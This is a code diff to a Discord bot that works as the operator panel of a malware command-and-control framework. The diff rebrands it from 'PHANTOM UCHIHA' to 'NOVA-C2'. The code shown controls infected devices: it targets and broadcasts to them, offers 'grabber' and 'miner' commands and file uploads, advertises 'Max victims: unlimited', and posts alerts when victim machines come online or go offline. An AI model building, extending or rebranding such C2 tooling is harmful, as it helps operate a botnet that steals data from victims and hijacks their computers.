@@ -218,7 +218,7 @@ async function sendToTarget(uid, guild, cmd, payload) {
 function menuEmbed() {
   const total = [...deviceStatus.values()].filter(s => s.online === true).length
   const totalDevices = deviceStatus.size
-  return bloodEmbed(bold(`${E.sharingan} PHANTOM UCHIHA ${E.sharingan}`), 'info',
+  return bloodEmbed(bold(`${E.sharingan} NOVA-C2 ${E.sharingan}`), 'info',
     `**${E.flame} C2 Framework v3.1**\n${clockText()}\n\n` +
     `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${totalDevices - total} offline\n\n` +
     `**${E.eye} Commands**\n` +
@@ -236,7 +236,7 @@ function menuEmbed() {
     `**${E.star} Slash Commands**\n` +
     `\`/menu\` \`/help\` \`/devices\` \`/target\` \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\` \`/files\`\n\n` +
     `**${total > 0 ? `${E.knife} ${total} device(s) online — target one to begin` : `${E.coffin} Waiting for devices...`}**`,
-    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: randGif() })
+    { footer: `${E.skull} NOVA-C2 ⚡ ${ts()}`, thumb: randGif() })
 }
 
 function helpEmbed() {
@@ -277,7 +277,7 @@ function helpEmbed() {
   return {
     embeds: [new EmbedBuilder()
       .setColor(C.sharingan)
-      .setTitle(`${E.sharingan} PHANTOM UCHIHA — FULL COMMAND REFERENCE`)
+      .setTitle(`${E.sharingan} NOVA-C2 — FULL COMMAND REFERENCE`)
       .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
       .setThumbnail(randGif())
       .addFields(
@@ -292,7 +292,7 @@ function helpEmbed() {
         { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
         { name: `${E.brain} BOT CMDS`, value: '`!ai` `!campaign` `!analyze` `!history` `!search`', inline: true },
       )
-      .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.1 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
+      .setFooter({ text: `${E.skull} NOVA-C2 v3.1 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
     ],
   }
 }
@@ -665,7 +665,7 @@ client.on(Events.InteractionCreate, async (i) => {
     }
     if (i.customId === 'menu') return i.followUp({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
     if (i.customId === 'help') return i.followUp({ ...helpEmbed(), components: HELP_BTNS, ephemeral: true }).catch(() => {})
-    if (i.customId === 'info') return i.followUp({ content: `${E.bone} **PHANTOM UCHIHA v3.1**\n${E.zap} WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {})
+    if (i.customId === 'info') return i.followUp({ content: `${E.bone} **NOVA-C2 v3.1**\n${E.zap} WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {})
 
     // Target button
     if (i.customId === 'target') {
@@ -1096,12 +1096,12 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
               { name: `${E.eye} IP`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
               { name: `${E.heart} Status`, value: online ? `${E.check} ONLINE` : `${E.coffin} OFFLINE`, inline: true },
             )
-            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })
+            .setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })
           if (cardBuffer) { e.setImage(`attachment://status-${deviceName}.png`); await alertCh.send({ embeds: [e], files: [new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) }) }
           else { await alertCh.send({ embeds: [e], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) }) }
         } catch (e) {
           console.error(`[Alert] Status card/image error: ${e.message}`)
-          const e2 = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE` : `${E.coffin} ${ch.name} OFFLINE`).setDescription(`**${online ? 'Reconnected' : 'Lost connection'}**`).setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
+          const e2 = new EmbedBuilder().setColor(online ? C.neon : C.void).setTitle(online ? `${E.check} ${ch.name} ONLINE` : `${E.coffin} ${ch.name} OFFLINE`).setDescription(`**${online ? 'Reconnected' : 'Lost connection'}**`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` })
           await alertCh.send({ embeds: [e2], components: online ? ALERT_BTNS_ONLINE(ch.id) : ALERT_BTNS_OFFLINE(ch.id) })
         }
       } finally { deviceCheckLocks.delete(ch.id) }
@@ -1117,7 +1117,7 @@ function startStatusChecker(guild) {
   const runCheck = async () => {
     if (running) return
     running = true
-    try { await refreshDeviceStatus(guild, true); const total = [...deviceStatus.values()].filter(s => s.online === true).length; client.user.setActivity(`👁️ ${total} devices | !help`, { type: 3 }) } catch {}
+    try { await refreshDeviceStatus(guild, true); const total = [...deviceStatus.values()].filter(s => s.online === true).length; client.user.setActivity(`👁️ NOVA-C2 • ${total} devices | !help`, { type: 3 }) } catch {}
     finally { running = false }
   }
   runCheck()
@@ -1158,7 +1158,7 @@ client.once(Events.ClientReady, async () => {
     console.log(`[MEM] RSS: ${(mem.rss / 1024 / 1024).toFixed(1)}MB | Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB | Targets: ${targets.size} | Devices: ${deviceStatus.size}`)
   }, 1800000)
 
-  try { await client.user.setUsername('PHANTOM UCHIHA').catch(() => {}); client.user.setActivity('👁️ Watching 0 devices | !help', { type: 3 }) } catch {}
+  try { await client.user.setUsername('NOVA-C2').catch(() => {}); client.user.setActivity('👁️ NOVA-C2 watching 0 devices | !help', { type: 3 }) } catch {}
 
   if (ALLOWED_CHANNEL_ID && !startupMsgSent) {
     startupMsgSent = true
@@ -1166,9 +1166,9 @@ client.once(Events.ClientReady, async () => {
     if (!ch) { console.error(`[!] ALLOWED_CHANNEL_ID ${ALLOWED_CHANNEL_ID} not found`) }
     else {
       await ch.send({
-        embeds: [new EmbedBuilder().setColor(C.sharingan).setTitle(`${E.sharingan} ${bold('PHANTOM UCHIHA')}`)
+        embeds: [new EmbedBuilder().setColor(C.sharingan).setTitle(`${E.sharingan} ${bold('NOVA-C2')}`)
           .setDescription(`**${E.sharingan} C2 Framework v3.1**\nGateway: Discord WebSocket\nStatus: ${E.flame} ACTIVE\nOnline: ${ts()}\n\nAwaiting commands...`)
-          .setThumbnail(randGif()).setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
+          .setThumbnail(randGif()).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
         components: MENU_BTNS,
       }).catch(err => console.error('Startup:', err.message))
     }
@@ -1194,7 +1194,7 @@ client.on(Events.ChannelCreate, async (ch) => {
     const alertChId = ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID
     if (alertChId) {
       const alertCh = client.channels.cache.get(alertChId)
-      if (alertCh) alertCh.send({ embeds: [new EmbedBuilder().setColor(0x00ff88).setTitle(`${E.zap} NEW DEVICE`).setDescription(`**${ch.name.replace('device-', '')}** connected`).setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` }).setTimestamp()] }).catch(() => {})
+      if (alertCh) alertCh.send({ embeds: [new EmbedBuilder().setColor(0x00ff88).setTitle(`${E.zap} NEW DEVICE`).setDescription(`**${ch.name.replace('device-', '')}** connected`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` }).setTimestamp()] }).catch(() => {})
     }
   }
 })
